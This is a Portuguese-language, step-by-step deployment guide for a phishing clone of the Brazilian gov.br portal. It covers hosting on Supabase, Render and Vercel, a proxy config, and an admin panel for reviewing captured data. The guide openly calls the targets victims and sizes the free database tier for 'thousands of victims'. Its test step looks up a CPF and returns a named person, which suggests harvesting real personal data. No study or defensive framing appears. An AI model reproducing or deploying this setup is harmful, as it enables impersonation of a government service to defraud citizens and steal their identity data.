# Guia de Deploy — Clone Phishing gov.br

## Visão Geral

```
Vítima → Vercel (frontend) → /api/* → Render (backend) → Supabase (banco)
```

3 serviços, todos **grátis**, deploy em ~20 minutos.

---

## PASSO 1: Supabase (Banco de Dados) — 5 min

1. Acesse https://supabase.com → **Start your project** → login com GitHub
2. Clique **"New project"**
3. Preencha:
   - **Name:** `phishing-db`
   - **Database Password:** invente uma senha forte (ANOTE!)
   - **Region:** South America (São Paulo)
4. Clique **"Create project"** → espere ~2 min
5. No menu lateral, vá em **SQL Editor** → **New Query**
6. Abra o arquivo `backend/schema.sql` deste pacote, **copie TUDO**
7. Cole no SQL Editor e clique **Run** (Ctrl+Enter)
8. Vá em **Settings → API** (menu lateral), anote:
   - **Project URL:** `https://xxxxxxxxxxxx.supabase.co`
   - **anon public key:** `eyJhbGciOi...` (string longa)

---

## PASSO 2: Render (Backend) — 5 min

1. Acesse https://render.com → **Get Started** → login com GitHub
2. Clique **New + → Web Service**
3. Em "Deploy from Git Repository", clique **"Public Git repository"**
   - Se já tiver subido o código no GitHub, cole a URL do repo
   - Se NÃO tiver GitHub, pule — use o upload manual (ver alternativa abaixo)
4. Configure:
   - **Name:** `phishing-backend`
   - **Root Directory:** `backend`
   - **Runtime:** Node
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
5. Em **Environment Variables**, adicione:
   ```
   SUPABASE_URL    = https://xxxxxxxxxxxx.supabase.co   (do passo 1)
   SUPABASE_ANON_KEY = eyJhbGciOi...                     (do passo 1)
   JWT_SECRET      = frase_secreta_aleatoria_gigante     (INVENTE algo)
   PORT            = 3001
   ```
6. Clique **"Create Web Service"**
7. Aguarde o deploy (~2 min). Anote a URL gerada:
   - Ex: `https://phishing-backend.onrender.com`

### Alternativa sem GitHub (Upload Manual)

Se não quiser usar GitHub, faça upload do ZIP:

```bash
# No seu computador, dentro da pasta clone_phishing_govbr:
cd backend
zip -r backend.zip .
```

Depois no Render, escolha **"Deploy from Git" → "Upload"** e envie o `backend.zip`.

---

## PASSO 3: Vercel (Frontend) — 3 min

1. Acesse https://vercel.com → **Sign Up** → login com GitHub
2. Clique **"New Project"**
3. Faça upload da pasta `clone_phishing_govbr` INTEIRA (arraste o diretório)
4. ANTES de dar deploy, edite o `vercel.json`:
   - Troque `SEU_BACKEND.onrender.com` pela URL real do Render (ex: `https://phishing-backend.onrender.com`)
5. Clique **"Deploy"**
6. Em ~30 segundos, Vercel te dá uma URL:
   - Ex: `https://clone-phishing.vercel.app`

### O vercel.json faz o quê?

```json
{
  "rewrites": [
    { "source": "/api/(.*)", "destination": "https://SEU_BACKEND.onrender.com/api/:1" },
    { "source": "/((?!api).*)", "destination": "/index.html" }
  ]
}
```

- Toda chamada `/api/*` → proxy transparente pro Render
- Qualquer outra rota → `index.html` (SPA routing)

---

## PASSO 4: Testar

1. Abra a URL do Vercel no navegador
2. A página gov.br falso deve carregar normalmente
3. Teste validar um CPF: `12345678909` → deve retornar "Daiana Lassolli"
4. Vá em `https://SUA_URL.vercel.app/admin` → login: `admin` / `admin123`
5. Pronto. Tudo funcionando.

---

## Resumo das URLs

| Serviço | URL |
|---|---|
| Frontend | `https://clone-phishing.vercel.app` |
| Backend API | `https://phishing-backend.onrender.com` |
| Banco | `https://xxxxxxxxxxxx.supabase.co` |
| Painel Admin | `https://clone-phishing.vercel.app/admin` |

---

## ⚠️ Avisos Importantes

1. **Render free tier DORME após 15 min sem tráfego.** A primeira requisição demora ~30-50s pra acordar. Depois fica rápido. Se precisar 24/7, assine o plano de $7/mês.

2. **Vercel free tier tem 100 GB de banda/mês.** Suficiente pra 100k+ pageviews.

3. **Supabase free tier:** 500 MB de banco + 2 GB de banda/mês. Suficiente pra milhares de vítimas.

4. **Senha do admin (`admin`/`admin123`) está em plaintext.** Troque a senha no SQL Editor:
   ```sql
   UPDATE admins SET password_hash = 'sua_nova_senha' WHERE username = 'admin';
   ```

5. **Use hash de senha em produção.** O código atual compara plaintext. Pra usar bcrypt:
   - Gere o hash: `node -e "console.log(require('bcryptjs').hashSync('sua_senha', 10))"`
   - Atualize o banco com o hash
   - Troque `password === admin.password_hash` por `bcrypt.compareSync(password, admin.password_hash)` no `server.js`
